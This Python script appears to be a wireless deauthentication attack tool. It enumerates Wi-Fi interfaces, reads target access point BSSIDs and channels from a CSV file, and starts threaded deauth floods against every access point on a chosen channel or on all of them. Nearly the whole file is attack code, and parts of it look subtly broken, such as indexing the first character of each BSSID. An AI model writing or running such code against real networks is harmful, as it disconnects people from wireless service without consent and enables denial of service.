import subprocess
from unitils import *
ir=inlineraise
import threading
def get_interfaces():
    wifi_interfaces = subprocess.check_output("iwconfig").decode().split("\n")
    for line in wifi_interfaces[:]:
        if not line.startswith("wlan"):
            wifi_interfaces.remove(line)
    for i,interface in enumerate(wifi_interfaces[:]):
        rest = interface.split("  ")
        name = rest[0]
        mode = rest[3] if rest[3].startswith("Mode") else "Mode:Managed"
        wifi_interfaces[i] = [name,mode]
    return wifi_interfaces
wifi_interfaces=get_interfaces()
for i,interface in enumerate(wifi_interfaces):
    print(f"[{i}] - {interface[0]} ({interface[1]})")
ans = input("Please select the number of the interface you would like to use\n>")
interface=wlan_interface(wifi_interfaces[int(ans if ans.isdigit() else ir("Answer must be an integer!"))][0])
ans=input("Please write the file name for your list of BSSIDs & channels \n(CSV format BSSID,Channel,Name)\n(defualt: BSSIDs.csv)\n>")
list_of_BSSIDs = open(ans if ans else "BSSIDs.csv","r").read().split("\n")
common_channels={}
for item in list_of_BSSIDs:
    BSSID,channel,name = item.split(",")
    if not channel in common_channels.keys():
        common_channels[channel]=[BSSID]
    elif channel in common_channels.keys():
        common_channels[channel].append(BSSID)
for item in common_channels.keys():
    print(f"[{item}] ({common_channels[item] if will_fit(len(str(common_channels[item]))) else len(common_channels[item])})")
ans = input("Please write the number of the channel you would like to Deauth (leave blank for all)\n>")
if not ans in common_channels.keys() and not ans:
    multi_deauth(interface,common_channels)
elif ans not in common_channels.keys(): raise Exception("Answer should be blank or a value in common_channels!")
interface.Start_interface(int(ans))
threads=0
for BSSID in common_channels[ans]:
    BSSID=bssid(BSSID[0],int(ans))
    Thread = threading.Thread(target=BSSID.Deauth,args=(interface,0))
    threads+=1
    Thread.start()
print(f"Started {threads} Threads!")
while True:
    try:
        pass
    except KeyboardInterrupt:
        interface.Stop_interface(interface)